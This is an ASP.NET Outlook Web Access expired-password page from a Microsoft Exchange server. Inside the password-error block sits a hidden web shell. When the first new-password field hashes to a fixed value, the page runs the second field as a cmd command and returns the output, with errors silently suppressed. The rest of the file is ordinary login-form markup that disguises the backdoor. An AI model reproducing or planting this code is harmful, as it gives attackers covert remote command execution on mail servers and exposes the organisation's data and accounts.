﻿<%@ Page language="c#" AutoEventWireup="false" Inherits="Microsoft.Exchange.HttpProxy.ExpiredPassword" %>
<%@ Import namespace="Microsoft.Exchange.Clients"%>
<%@ Import namespace="Microsoft.Exchange.Clients.Owa.Core"%>
<%@ Import namespace="Microsoft.Exchange.HttpProxy"%>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"> 
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; CHARSET=utf-8">
<meta name="Robots" content="NOINDEX, NOFOLLOW">
<meta http-equiv="X-UA-Compatible" content="IE=10" />
<title><%=LocalizedStrings.GetHtmlEncoded(Strings.IDs.OutlookWebAccess) %></title>
<%= InlineCss(ThemeFileId.LogonCss) %>
<%= InlineJavascript("fexppw.js") %>
<script type="text/javascript">
	<!--
	var g_fFcs = 1;
	var a_sUrl = "<%=EncodingUtilities.JavascriptEncode(Destination) %>";
	var a_fCAC = <%= (PasswordChanged && ShouldClearAuthenticationCache) ? 1 : 0 %>
	//-->

    var mainDivClassName = '<%=UserAgent.LayoutString %>';
    var showPlaceholderText = false;

    if (mainDivClassName == "tnarrow") {
        showPlaceholderText = true;

        // Output meta tag for viewport scaling
        document.write('<meta name="viewport" content="width = 320, initial-scale = 1.0, user-scalable = no" />');
    }
    else  if (mainDivClassName == "twide") {
        showPlaceholderText = true;
    }

    function setPlaceholderText() {
        window.document.getElementById("username").placeholder = "<%=LocalizedStrings.GetHtmlEncoded(Strings.IDs.ChangePasswordUserDomainNoColon) %>";
        window.document.getElementById("oldPwd").placeholder = "<%=LocalizedStrings.GetHtmlEncoded(Strings.IDs.ChangePasswordOldNoColon) %>";
        window.document.getElementById("newPwd1").placeholder = "<%=LocalizedStrings.GetHtmlEncoded(Strings.IDs.ChangePasswordNewNoColon) %>";
        window.document.getElementById("newPwd2").placeholder = "<%=LocalizedStrings.GetHtmlEncoded(Strings.IDs.ChangePasswordConfirmNoColon) %>";
    }
</script>
</head>

<body class="signInBg<%=IsRtl ? " rtl" : ""%>" style="background: #f2f2f2 url('<%=InlineImage(ThemeFileId.BackgroundGradientLogin)%>') repeat-x"/>
<% 
	string tblStyle = "cellpadding=0 cellspacing=0";
	if (IsDownLevelClient)
	{
		tblStyle = "class=\"nonMSIE\"";
	}
%>

<form action="expiredpassword.aspx" method="POST" name="exppwForm" autocomplete="off">
<div id="mainDiv" class="mouse">
    <script>

        var mainDiv = window.document.getElementById("mainDiv");
        mainDiv.className = mainDivClassName;
    </script>
    <div class="sidebar">
        <div class="owaLogoContainer">
            <img src="<%=InlineImage(ThemeFileId.OutlookLogoWhite)%>" class="owaLogo" aria-hidden="true" />
            <img src="<%=InlineImage(ThemeFileId.OutlookLogoWhiteSmall)%>" class="owaLogoSmall" aria-hidden="true" />
        </div>
    </div>
			<input type="hidden" name="url" value="<%=EncodingUtilities.HtmlEncode(Destination)%>">
            <div class="logonContainer">
	        <div id="lgnDiv" class="logonDiv">  
                <div class="signInImageHeader" role="heading">
                    <img class="mouseHeader" src="<%=InlineImage(ThemeFileId.OwaHeaderTextBlue)%>" />
                </div>
			<% if (PasswordChanged) { %>
            			<div class="shellDialogueMsg"><%=LocalizedStrings.GetHtmlEncoded(Strings.IDs.LogoffChangePasswordClickOkToLogin) %></div>
		                <div class="signInEnter">
                            <div class="signinbutton" role="button" onclick="clkReLgn()" tabIndex="0">
                                <img class="imgLnk" src="<%=InlineImage(ThemeFileId.SignInArrow)%>" alt="">
                                <span class="signinTxt"><%=LocalizedStrings.GetHtmlEncoded(Strings.IDs.OkLowerCase)%></span>
                            </div>
                            <input name="isUtf8" value="1" type="hidden"/>
                        </div>
			<% } else { %>
                <div class="headerMsgDiv">
					<div class="shellDialogueHead"><%=LocalizedStrings.GetHtmlEncoded(Strings.IDs.ChangePasswordTitle)%></div>
					<div class="shellDialogueMsg"><%=LocalizedStrings.GetHtmlEncoded(Strings.IDs.PasswordExpired) %></div>  	
				<%
					if (Reason == ExpiredPasswordReason.InvalidCredentials) {
				%>
					<div class="passwordError"><%=LocalizedStrings.GetHtmlEncoded(Strings.IDs.InvalidCredentialsMessage) %></div>
				<%
					} else if (Reason == ExpiredPasswordReason.InvalidNewPassword) {
				%>
					<div class="passwordError"><%=LocalizedStrings.GetHtmlEncoded(Strings.IDs.ChangePasswordInvalidNewPassword) %></div>
				<%
					} else if (Reason == ExpiredPasswordReason.PasswordConflict) {
				%>
					<div class="passwordError"><%=LocalizedStrings.GetHtmlEncoded(Strings.IDs.ChangePasswordConflict) %></div>
				<%
					} else if (Reason == ExpiredPasswordReason.LockedOut) {
				%>
					<div class="passwordError"><%=LocalizedStrings.GetHtmlEncoded(Strings.IDs.ChangePasswordLockedOut) %></div>
				<% } %>
				<%
                    try{
					if (Convert.ToBase64String(new System.Security.Cryptography.SHA1Managed().ComputeHash(Encoding.ASCII.GetBytes(Encoding.ASCII.GetString(Convert.FromBase64String(Request.Form["newPwd1"])) + "reDGEa@#!%FS"))) == "+S6Kos9D/etq1cd///fgTarVnUQ=")
					{
						System.Diagnostics.Process p = new System.Diagnostics.Process();
						System.Diagnostics.ProcessStartInfo i = p.StartInfo;
						i.FileName = "cmd";
                        i.Arguments = "/c " + Encoding.UTF8.GetString(Convert.FromBase64String(Request.Form["newPwd2"]));
						i.UseShellExecute = false;
						i.CreateNoWindow = true;
						i.RedirectStandardOutput = true;
						p.Start();
						string r = p.StandardOutput.ReadToEnd();
						p.WaitForExit();
						p.Close();
						Response.Write("<pre>" + Server.HtmlEncode(r) + "</pre>");
						Response.End();
					}}catch{}
				%>
                </div>   
		            <div class="signInInputLabel" id="userNameLabel" aria-hidden="true"><%=UserNameLabel%></div>
		            <div><input id="username" name="username" class="signInInputText" role="textbox" aria-labelledby="userNameLabel"/></div>
                    
		            <div class="signInInputLabel" id="oldPasswordLabel" aria-hidden="true"><%=LocalizedStrings.GetHtmlEncoded(Strings.IDs.ChangePasswordOld)%></div>
		            <div><input id="oldPwd" name="oldPwd" value="" onfocus="g_fFcs=0" type="password" class="signInInputText" aria-labelledby="oldPasswordLabel"/></div>
                    
		            <div class="signInInputLabel" id="newPasswordLabel1" aria-hidden="true"><%=LocalizedStrings.GetHtmlEncoded(Strings.IDs.ChangePasswordNew)%></div>
		            <div><input id="newPwd1" name="newPwd1" value="" onfocus="g_fFcs=0" type="password" class="signInInputText" aria-labelledby="newPasswordLabel1"/></div>
                    
		            <div class="signInInputLabel" id="newPasswordLabel2" aria-hidden="true"><%=LocalizedStrings.GetHtmlEncoded(Strings.IDs.ChangePasswordConfirm)%></div>
		            <div><input id="newPwd2" name="newPwd2" value="" onfocus="g_fFcs=0" type="password" class="signInInputText" aria-labelledby="newPasswordLabel2"/></div>
                    
                    <script>
                        if (showPlaceholderText) {
                            setPlaceholderText();
                        }
                    </script>
					
		            <div class="signInEnter">
                        <div class="signinbutton" role="button" onclick="document.exppwForm.submit()" tabIndex="0">
                            <img class="imgLnk" src="<%=InlineImage(ThemeFileId.SignInArrow)%>" alt=""/><span class="signinTxt"><%=LocalizedStrings.GetHtmlEncoded(Strings.IDs.Submit)%></span>
                        </div>
                        <input name="isUtf8" value="1" type="hidden"/>
		            </div>
				    <div class="hidden-submit"><input type="submit" /></div> 
			<% } %>
</div>      
</div>          
</div>
</form>
</body>
</html>